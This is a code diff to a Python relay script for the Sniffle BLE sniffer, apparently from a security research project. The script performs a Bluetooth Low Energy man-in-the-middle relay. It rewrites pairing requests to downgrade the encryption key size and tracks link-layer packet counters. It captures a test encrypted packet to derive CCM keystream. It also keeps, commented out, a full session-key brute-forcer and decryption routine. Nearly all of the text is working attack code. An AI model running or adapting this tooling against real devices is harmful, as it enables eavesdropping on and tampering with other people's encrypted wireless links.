@@ -25,7 +25,7 @@ from sniffle.packet_decoder import DPacketMessage, DataMessage, LlDataContMessag
 from sniffle.relay_protocol import RelayServer, MessageType, ErrorCode
 
 from mitble_help import downgrade_pairing_request, downgrade_pairing_response
-from brute_forcer import make_ble_ccm_nonce, ble_ccm_encrypt, ble_ccm_decrypt_verify
+from brute_forcer import make_ble_ccm_nonce, make_ble_ccm_counter_block, ble_ccm_encrypt, ble_ccm_decrypt_verify
 
 """
 Relay attack principles:
@@ -89,8 +89,15 @@ bruteforce_thread = None
 pcwriter = None
 enc_start_seen = False          # we have seen LL_START_ENC_REQ from P
 first_enc_rsp_pkt = None        # first non-empty packet after that
+uart_test_pending = False
+uart_last_seq = None
+test_pkt = None
 
-
+link_encryption_active = False
+enc_ctr_p_to_c = 0
+enc_ctr_c_to_p = 0
+last_sn_p_to_c = None
+last_sn_c_to_p = None
 
 # IVs for building the "real" C<->P IV
 ivm_from_c = None   # IVm from real central C (C -> P_r, LL_ENC_REQ)
@@ -104,6 +111,8 @@ def sigint_handler(sig, frame):
     sys.exit(0)
 
 def main():
+    global uart_test_pending, uart_last_seq
+
     aparse = argparse.ArgumentParser(description="Relay master script for Sniffle BLE5 sniffer")
     aparse.add_argument("-s", "--serport", default=None, help="Sniffer serial port name")
     aparse.add_argument("-c", "--advchan", default=37, choices=[37, 38, 39], type=int,
@@ -130,7 +139,7 @@ def main():
     aparse.add_argument("--periph-baud", type=int, default=115200,
         help="Baudrate for the REAL peripheral (default: 115200)")
     args = aparse.parse_args()
-    global hw
+    global hw, periph_ser
     hw = SniffleHW(args.serport)
     new_key_size = 0x04
 
@@ -208,14 +217,18 @@ def main():
 
     if args.periph_serial:
         try:
-            with serial.Serial(args.periph_serial, args.periph_baud, timeout=0.5) as ser:
-                ser.write(b'0')
-            print(f"[UART->PERIPH] Sent '0' to {args.periph_serial} (pause advertising).")
+            periph_ser = serial.Serial(
+                args.periph_serial,
+                args.periph_baud,
+                timeout=0,   # non-blocking, works well with select()
+            )
+            # e.g. send '0' to pause advertising if you still want that:
+            periph_ser.write(b'0')
+            print(f"[UART->PERIPH] Opened {periph_ser.port}, sent '0' (pause advertising).")
         except Exception as e:
-            print(f"[UART->PERIPH] WARNING: could not send '0' on {args.periph_serial}: {e}", file=sys.stderr)
-
-    if args.pause:
-        input("Press enter to continue...")
+            print(f"[UART->PERIPH] WARNING: could not open {args.periph_serial}: {e}",
+                  file=sys.stderr)
+            periph_ser = None
     conn.send_msg(MessageType.PING, b'')
 
     # relay slave will now impersonate our target
@@ -229,13 +242,13 @@ def main():
     if not isinstance(conn_req, ConnectIndMessage):
         raise ValueError("CONN_REQ was not a CONN_REQ!")
 
-    if args.periph_serial:
+    if periph_ser is not None:
         try:
-            with serial.Serial(args.periph_serial, args.periph_baud, timeout=0.5) as ser:
-                ser.write(b'1')
-            print(f"[UART->PERIPH] Sent '1' to {args.periph_serial} (resume advertising).")
+            periph_ser.write(b'1')
+            print(f"[UART->PERIPH] Sent '1' on {periph_ser.port} (resume advertising).")
         except Exception as e:
-            print(f"[UART->PERIPH] WARNING: could not send '1' on {args.periph_serial}: {e}", file=sys.stderr)
+            print(f"[UART->PERIPH] WARNING: could not send '1' on {periph_ser.port}: {e}",
+                file=sys.stderr)
 
     print("Relay slave notified us of connection request. Connecting to real target...")
     print(conn_req)
@@ -302,12 +315,46 @@ def main():
     filter_changes = args.fastslave or args.fastmaster
 
     while True:
-        ready, _, _ = select([hw.ser.fd, conn.sock], [], [])
+        fds = [hw.ser.fd, conn.sock]
+        if periph_ser is not None:
+            try:
+                fds.append(periph_ser.fileno())
+            except Exception:
+                # fileno() may not exist on some platforms; then you can’t use select() on it
+                print("[UART] error using fileno()")
+                pass
+
+        ready, _, _ = select(fds, [], [])
 
         if conn.sock in ready:
             sock_recv_print_forward(conn, args.quiet, new_key_size, filter_changes)
+
         if hw.ser.fd in ready:
-            ser_recv_print_forward(conn, args.quiet,new_key_size, filter_changes)
+            ser_recv_print_forward(conn, args.quiet, new_key_size, filter_changes)
+
+        if periph_ser is not None:
+            try:
+                fd = periph_ser.fileno()
+            except Exception:
+                fd = None
+
+            if fd is not None and fd in ready:
+                # read one full line from DK: e.g. "B 7\r\n"
+                line = periph_ser.readline()
+                if line:
+                    print(f"[UART_PERIPH] got line: {line!r}")
+                    if line.startswith(b'B'):
+                        parts = line.split()
+                        if len(parts) >= 2:
+                            try:
+                                seq = int(parts[1])
+                                print(f"[UART_PERIPH] test notification seq={seq}")
+                                uart_test_pending = True
+                                print(f"[UART_PERIPH] status uart_test_pending: {uart_test_pending}")
+                                uart_last_seq = seq
+                            except ValueError:
+                                print(f"[UART_PERIPH] could not parse seq from {line!r}")
+
 
 def has_instant(pkt):
     return isinstance(pkt, LlControlMessage) and pkt.opcode in [0x00, 0x01, 0x18]
@@ -375,134 +422,253 @@ def _extract_ivs_from_ll_enc_rsp(ctrl: LlControlMessage):
         return None
     return body[-4:]  # bytes 9..12
 
-def brute_force_key_worker(hdr0: int,
-                           iv: bytes,
-                           enc_opcode: bytes,
-                           enc_mic_on_air: bytes,
-                           new_key_size: int,
-                           direction_bit: int):
-    """
-    Background brute-forcer targeting the encrypted LL_START_ENC_RSP.
+#def brute_force_key_worker(hdr0: int,
+#                           iv: bytes,
+#                           enc_opcode: bytes,
+#                           enc_mic_on_air: bytes,
+#                           new_key_size: int,
+#                           direction_bit: int):
+#    """
+#    Background brute-forcer targeting the encrypted LL_START_ENC_RSP.
+#
+#    hdr0           : LL data header first octet from the PDU
+#    iv             : 8-byte IV (IVm||IVs) for the *real* C<->P link
+#    enc_opcode     : 1-byte encrypted opcode from the packet
+#    enc_mic_on_air : 4-byte MIC from the packet (on-air, encrypted tag)
+#    new_key_size   : number of unknown key bytes (1..16). First (16-new_key_size)
+#                     bytes are assumed to be 0x00.
+#    direction_bit  : 1 for Central->Peripheral, 0 for Peripheral->Central
+#    """
+#    global found_key
+#
+#    print(f"[BRUTE] Starting key search with new_key_size={new_key_size} bytes")
+#
+#    # Nonce for the FIRST encrypted LL_START_ENC_RSP (packetCounter = 0)
+#    nonce = make_ble_ccm_nonce(iv, packet_counter=0, direction_bit=direction_bit)
+#
+#    zero_prefix_len = 16 - new_key_size
+#    suffix_bits = 8 * new_key_size
+#    total_candidates = 1 << suffix_bits
+#
+#    # Plaintext payload we know for LL_START_ENC_RSP
+#    plain_payload = b"\x06"
+#
+#    for idx in range(total_candidates):
+#        if bruteforce_stop.is_set():
+#            print("[BRUTE] Stop signal set, exiting worker.")
+#            return
+#
+#        # Generate candidate key lazily: 00..00 || suffix
+#        suffix = idx.to_bytes(new_key_size, "big")
+#        key = b"\x00" * zero_prefix_len + suffix
+#
+#        try:
+#            # AES-CCM encrypt one-byte opcode 0x06
+#            cipher_payload, tag = ble_ccm_encrypt(
+#                key=key,
+#                nonce=nonce,
+#                header_first_octet=hdr0,
+#                payload=plain_payload,
+#            )
+#        except Exception:
+#            # Bad inputs etc. Don't let one failure kill the worker.
+#            continue
+#
+#        # 1) First filter: MIC/tag must match the captured MIC
+#        if tag != enc_mic_on_air:
+#            continue
+#
+#        # 2) Only for MIC matches, check encrypted opcode byte
+#        if cipher_payload[:1] != enc_opcode:
+#            continue
+#
+#        # Both checks passed → very strong evidence we found the correct key
+#        with _found_key_lock:
+#            found_key = key
+#        print(f"[BRUTE] Found session key: {key.hex()}")
+#        bruteforce_stop.set()
+#        return
+#
+#    print("[BRUTE] Exhausted key space without finding key.")
 
-    hdr0           : LL data header first octet from the PDU
-    iv             : 8-byte IV (IVm||IVs) for the *real* C<->P link
-    enc_opcode     : 1-byte encrypted opcode from the packet
-    enc_mic_on_air : 4-byte MIC from the packet (on-air, encrypted tag)
-    new_key_size   : number of unknown key bytes (1..16). First (16-new_key_size)
-                     bytes are assumed to be 0x00.
-    direction_bit  : 1 for Central->Peripheral, 0 for Peripheral->Central
-    """
-    global found_key
 
-    print(f"[BRUTE] Starting key search with new_key_size={new_key_size} bytes")
-
-    # Nonce for the FIRST encrypted LL_START_ENC_RSP (packetCounter = 0)
-    nonce = make_ble_ccm_nonce(iv, packet_counter=0, direction_bit=direction_bit)
-
-    zero_prefix_len = 16 - new_key_size
-    suffix_bits = 8 * new_key_size
-    total_candidates = 1 << suffix_bits
-
-    # Plaintext payload we know for LL_START_ENC_RSP
-    plain_payload = b"\x06"
-
-    for idx in range(total_candidates):
-        if bruteforce_stop.is_set():
-            print("[BRUTE] Stop signal set, exiting worker.")
-            return
-
-        # Generate candidate key lazily: 00..00 || suffix
-        suffix = idx.to_bytes(new_key_size, "big")
-        key = b"\x00" * zero_prefix_len + suffix
-
-        try:
-            # AES-CCM encrypt one-byte opcode 0x06
-            cipher_payload, tag = ble_ccm_encrypt(
-                key=key,
-                nonce=nonce,
-                header_first_octet=hdr0,
-                payload=plain_payload,
-            )
-        except Exception:
-            # Bad inputs etc. Don't let one failure kill the worker.
-            continue
-
-        # 1) First filter: MIC/tag must match the captured MIC
-        if tag != enc_mic_on_air:
-            continue
-
-        # 2) Only for MIC matches, check encrypted opcode byte
-        if cipher_payload[:1] != enc_opcode:
-            continue
-
-        # Both checks passed → very strong evidence we found the correct key
-        with _found_key_lock:
-            found_key = key
-        print(f"[BRUTE] Found session key: {key.hex()}")
-        bruteforce_stop.set()
-        return
-
-    print("[BRUTE] Exhausted key space without finding key.")
-
-
-def decrypt_if_possible(pkt: DataMessage, direction_bit: int):
-    """Best-effort decrypt of an encrypted DataMessage once we know the key."""
-    if found_key is None or iv_real_cp is None:
-        return
-
-    # Only handle actual data PDUs, skip empty LL_DATA_CONT
-    if not isinstance(pkt, DataMessage):
-        return
-
-    pdu = pkt.body
-    if len(pdu) < 2:
-        return
-
-    hdr0 = pdu[0]
-    length = pdu[1]
-    payload = pdu[2:2+length]
-    if len(payload) < 5:
-        return
-
-    ciphertext = payload[:-4]
-    tag_on_air = payload[-4:]
-
-    # TODO: maintain a per-direction packetCounter so you can build the right nonce.
-    # For the first encrypted packet we know it's 0; for later packets you'll want
-    # to increment counters per direction.
-    packet_counter = 0  # placeholder – you can wire real counters later
-    nonce = make_ble_ccm_nonce(iv_real_cp, packet_counter, direction_bit)
-
-    try:
-        pt = ble_ccm_decrypt_verify(
-            key=found_key,
-            nonce=nonce,
-            header_first_octet=hdr0,
-            ciphertext=ciphertext,
-            tag=tag_on_air,
-        )
-        print(f"[DEC] Decrypted payload dir={direction_bit}: {_hx(pt)}")
-    except ValueError:
-        # MIC failed – either wrong counter or retransmit, etc.
-        pass
+#def decrypt_if_possible(pkt: DataMessage, direction_bit: int):
+#    """Best-effort decrypt of an encrypted DataMessage once we know the key."""
+#    if found_key is None or iv_real_cp is None:
+#        return
+#
+#    # Only handle actual data PDUs, skip empty LL_DATA_CONT
+#    if not isinstance(pkt, DataMessage):
+#        return
+#
+#    pdu = pkt.body
+#    if len(pdu) < 2:
+#        return
+#
+#    hdr0 = pdu[0]
+#    length = pdu[1]
+#    payload = pdu[2:2+length]
+#    if len(payload) < 5:
+#        return
+#
+#    ciphertext = payload[:-4]
+#    tag_on_air = payload[-4:]
+#
+#    # TODO: maintain a per-direction packetCounter so you can build the right nonce.
+#    # For the first encrypted packet we know it's 0; for later packets you'll want
+#    # to increment counters per direction.
+#    packet_counter = 0  # placeholder – you can wire real counters later
+#    nonce = make_ble_ccm_nonce(iv_real_cp, packet_counter, direction_bit)
+#
+#    try:
+#        pt = ble_ccm_decrypt_verify(
+#            key=found_key,
+#            nonce=nonce,
+#            header_first_octet=hdr0,
+#            ciphertext=ciphertext,
+#            tag=tag_on_air,
+#        )
+#        print(f"[DEC] Decrypted payload dir={direction_bit}: {_hx(pt)}")
+#    except ValueError:
+#        # MIC failed – either wrong counter or retransmit, etc.
+#        pass
 
 def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
-    global enc_start_seen, first_enc_rsp_pkt   # <<<
-    global ivm_from_c, ivs_from_p, iv_real_cp   # ← add this
+    global enc_start_seen, first_enc_rsp_pkt
+    global ivm_from_c, ivs_from_p, iv_real_cp
+    global uart_test_pending, uart_last_seq, test_pkt
+    global link_encryption_active, enc_ctr_p_to_c, enc_ctr_c_to_p
+    global last_sn_p_to_c, last_sn_c_to_p
 
     msg = hw.recv_and_decode()
 
     if isinstance(msg, PacketMessage):
         msg = DPacketMessage.decode(msg)
-        # only forward non-empty data
+        # only forward non-empty data (for printing / forwarding decisions)
         empty = isinstance(msg, LlDataContMessage) and msg.data_length == 0
         block_req = filter_changes and is_param_req(msg)
 
-        #try to decrypt if key is found
+        # ------------------------------------------------------------
+        # 0) Encryption start detection on the C_r <-> P link
+        # ------------------------------------------------------------
+        # When we see LL_START_ENC_REQ (opcode 0x05) on this link,
+        # we reset per-role counters to 0 and start tracking.
+        if isinstance(msg, LlControlMessage) and msg.opcode == 0x05:
+            link_encryption_active = True
+            enc_ctr_p_to_c = 0
+            enc_ctr_c_to_p = 0
+            last_sn_p_to_c = None
+            last_sn_c_to_p = None
+            print("[ENC] Saw LL_START_ENC_RSP on real C_r<->P link → "
+                  "packetCounter per role starts at 0")
+
+        # ------------------------------------------------------------
+        # 1) Data PDUs from the real link
+        # ------------------------------------------------------------
         if isinstance(msg, DataMessage):
-            direction_bit = 1 if getattr(msg, "data_dir", 0) == 1 else 0
-            decrypt_if_possible(msg, direction_bit)
-        
+            # Sniffle uses data_dir to indicate direction:
+            #   0 = slave -> master (P -> C_r)
+            #   1 = master -> slave (C_r -> P)
+            data_dir = getattr(msg, "data_dir", 0)
+            #print("Data direction is: ", data_dir)
+            pdu = msg.body
+            if len(pdu) < 2:
+                # malformed, but don't crash the relay
+                print("[CTR] WARNING: Data PDU too short for header")
+                packet_counter = None
+            else:
+                hdr0 = pdu[0]
+                # SN is bit 2 of the LL data header
+                sn_bit = (hdr0 >> 2) & 0x01
+
+                packet_counter = None
+                if link_encryption_active:
+                    print(f"State of uart: {uart_test_pending}")
+                    if data_dir == 1:
+                        # slave -> master (P -> C_r)
+                        if last_sn_p_to_c is None or sn_bit != last_sn_p_to_c:
+                            packet_counter = enc_ctr_p_to_c
+                            enc_ctr_p_to_c += 1
+                            last_sn_p_to_c = sn_bit
+                            print(f"[CTR] P->C_r NEW encrypted PDU, packetCounter={packet_counter}")
+                        else:
+                            print("[CTR] P->C_r retransmit (SN unchanged) – not incrementing counter")
+                    else:
+                        # master -> slave (C_r -> P)
+                        if last_sn_c_to_p is None or sn_bit != last_sn_c_to_p:
+                            packet_counter = enc_ctr_c_to_p
+                            enc_ctr_c_to_p += 1
+                            last_sn_c_to_p = sn_bit
+                            print(f"[CTR] C_r->P NEW encrypted PDU, packetCounter={packet_counter}")
+                        else:
+                            print("[CTR] C_r->P retransmit (SN unchanged) – not incrementing counter")
+
+            # In BLE CCM, directionBit is:
+            #   0 = slave -> master, 1 = master -> slave
+            direction_bit = 0 if data_dir == 1 else 0
+
+            # Optional decryption (only if we know the key and have a counter)
+            #decrypt_if_possible(msg, direction_bit, packet_counter)
+
+            # --------------------------------------------------------
+            # NEW: test packet detection based on UART marker
+            # --------------------------------------------------------
+            if uart_test_pending and not empty and data_dir == 1:
+                print("Detected encrypted package!")
+                # We treat the first non-empty P->C_r DataMessage
+                # after "B <seq>" as the test encrypted packet.
+                uart_test_pending = False
+                test_pkt = msg
+
+                if packet_counter is not None:
+                    print(f"[TEST] This PDU has packetCounter={packet_counter}")
+
+                if len(pdu) < 2:
+                    print(f"[TEST] ERROR: PDU too short for header (len={len(pdu)})")
+                    return
+
+                hdr0 = pdu[0]          # LL data header first octet
+                length = pdu[1]        # payload + MIC length
+
+                if len(pdu) < 2 + length:
+                    print(f"[TEST] ERROR: malformed PDU: header says length={length}, "
+                          f"but only {len(pdu) - 2} payload bytes available")
+                    return
+
+                payload = pdu[2:2 + length]
+
+                print(f"[TEST] Captured test encrypted PDU for seq={uart_last_seq}")
+                print(f"       hdr0=0x{hdr0:02x}, length={length}")
+                print(f"       raw payload+MIC: {_hx(payload)}")
+
+                MIC_LEN = 4
+                if len(payload) <= MIC_LEN:
+                    print(f"[TEST] ERROR: payload too short for data+MIC (len={len(payload)})")
+                    return
+
+                ciphertext = payload[:-MIC_LEN]
+                mic_on_air = payload[-MIC_LEN:]
+
+                VALUE_LEN = 16
+                if len(ciphertext) < VALUE_LEN:
+                    print(f"[TEST] ERROR: ciphertext too short for test value "
+                          f"(len={len(ciphertext)}, need at least {VALUE_LEN})")
+                    return
+
+                print(f"       ciphertext (all): {_hx(ciphertext)}")
+                print(f"       MIC (on-air)    : {_hx(mic_on_air)}")
+
+                # If/when you want the nonce later:
+                if iv_real_cp is not None and packet_counter is not None:
+                    nonce = make_ble_ccm_nonce(iv_real_cp, packet_counter, direction_bit)
+                    a0 = make_ble_ccm_counter_block(nonce, block_index=1)
+                    plaintext_test = bytes([0x42, uart_last_seq] + [0xA5] * 14)
+                    ciphertext_test = ciphertext[-VALUE_LEN:]
+                    keystream = bytes(a ^ b for a, b in zip(plaintext_test, ciphertext_test))
+                    print(f"       Plaintext for HULK: {_hx(a0)}")
+                    print(f"       Ciphertext for HULK: {_hx(keystream)}")
+        # ------------------------------------------------------------
+
         # --- here: LL_ENC_RSP from *real peripheral* ---
         if isinstance(msg, LlControlMessage) and msg.opcode == 0x04:
             ivs = _extract_ivs_from_ll_enc_rsp(msg)
@@ -514,79 +680,24 @@ def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
                 iv_real_cp = ivm_from_c + ivs_from_p
                 print(f"[IV] Combined real C<->P IV (IVm||IVs): {_hx(iv_real_cp)}")
 
-
-        # --- detect LL_START_ENC_REQ and first non-empty packet after it ---  # <<<
-        if isinstance(msg, LlControlMessage) and msg.opcode == 0x05:           # 0x05 = LL_START_ENC_REQ
-            # This is the request from P → C; arm the detector
-            enc_start_seen = True
-            first_enc_rsp_pkt = None
-            print("[ENC] Saw LL_START_ENC_REQ; will mark first non-empty packet as LL_START_ENC_RSP")
-
-        elif enc_start_seen and first_enc_rsp_pkt is None and not empty:
-            # First non-empty PDU after LL_START_ENC_REQ; treat as LL_START_ENC_RSP
-            first_enc_rsp_pkt = msg
-            enc_start_seen = False  # we only care about the first one
-            # you can set any flag / side effect you like here:
-            msg.is_first_encrypted = True   # dynamic attribute for debugging
-            print("[ENC] First non-empty packet after LL_START_ENC_REQ "
-                  "(likely LL_START_ENC_RSP)")
-            pdu = msg.body
-            if len(pdu) < 2:
-                print("[ENC] Warning: PDU too short to have header, skipping")
-            else:
-                # 2-byte data header: pdu[0], pdu[1]
-                length = pdu[1]                 # payload + MIC length
-                payload = pdu[2:2 + length]     # encrypted payload (opcode) + MIC
-
-                if len(payload) < 5:
-                    print(f"[ENC] Unexpected payload length {len(payload)}, expected ≥5")
-                    enc_opcode = payload[:1] if payload else b""
-                    enc_mic    = payload[1:]
-                else:
-                    # For LL_START_ENC_REQ/RSP: 1 byte opcode + 4-byte MIC
-                    enc_opcode = payload[0:1]
-                    enc_mic    = payload[1:5]
-
-                print("[ENC] Encrypted opcode:", _hx(enc_opcode))
-                print("[ENC] Encrypted MIC   :", _hx(enc_mic))
-
-                # Start brute-forcer if we have the real IV and not already started
-                global bruteforce_thread
-                if iv_real_cp is not None and bruteforce_thread is None and found_key is None:
-                    hdr0 = pdu[0]           # LL data header first octet
-                    # For this LL_START_ENC_RSP we know packetCounter=0.
-                    # direction_bit: choose 0 or 1 depending on which direction
-                    # this encrypted RSP is on (e.g. 1 for C->P on C_r<->P).
-                    direction_bit = 1       # example for central->peripheral on this link
-
-                    bruteforce_thread = threading.Thread(
-                        target=brute_force_key_worker,
-                        args=(hdr0, iv_real_cp, enc_opcode, enc_mic, new_key_size, direction_bit),
-                        daemon=True,
-                    )
-                    bruteforce_thread.start()
-                    print("[BRUTE] Brute-force worker started in background.")
-                elif iv_real_cp is None:
-                    print("[BRUTE] WARNING: IV not known yet, cannot start brute-forcer.")
-
-        # --------------------------------------------------------------------  # <<<
-
-        # Try to downgrade entropy on outgoing DataMessage LL bodies
+        # ------------------------------------------------------------
+        # 2) SMP downgrade as before
+        # ------------------------------------------------------------
         if not empty and not block_req and isinstance(msg, DataMessage):
             old_body = msg.body
             new_ll, changed = downgrade_pairing_request(old_body, new_key_size)
             if changed:
-                # Best-effort: print SMP code and key sizes before/after
                 old_code, old_ks = _extract_smp_key_size_from_ll_body(old_body)
                 new_code, new_ks = _extract_smp_key_size_from_ll_body(new_ll)
-                # Human-friendly name
                 code_name = {0x01: "Pairing Request", 0x02: "Pairing Response"}.get(old_code, "SMP")
                 print(f"[DOWNGRADE] {code_name}: key size {old_ks} -> {new_ks}")
                 print(f"  old LL body ({len(old_body)} bytes): {_hex_bytes(old_body)}")
                 print(f"  new LL body ({len(new_ll)} bytes): {_hex_bytes(new_ll)}")
                 msg.body = new_ll
-                # Also rewrite SMP Confirm/Random in periph->central direction
 
+        if not empty and not block_req:
+            # Forward packets to the relay slave
+            conn.send_msg(MessageType.PACKET, pack('<H', msg.event) + msg.body)
         if block_req:
             # LL_REJECT_EXT_IND, unacceptable connection parameters
             hw.cmd_transmit(3, b'\x11\x0F\x3B')
@@ -594,8 +705,11 @@ def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
     print_message(msg, quiet)
 
 
+
 def sock_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
-    global ivm_from_c, ivs_from_p, iv_real_cp   # ← add this
+    global enc_start_seen, first_enc_rsp_pkt
+    global ivm_from_c, ivs_from_p, iv_real_cp
+    global uart_test_pending, uart_last_seq, test_pkt  # <-- add
     # receive packets from relay slave and retransmit them here
     mtype, body = conn.recv_msg()
     if mtype != MessageType.PACKET:
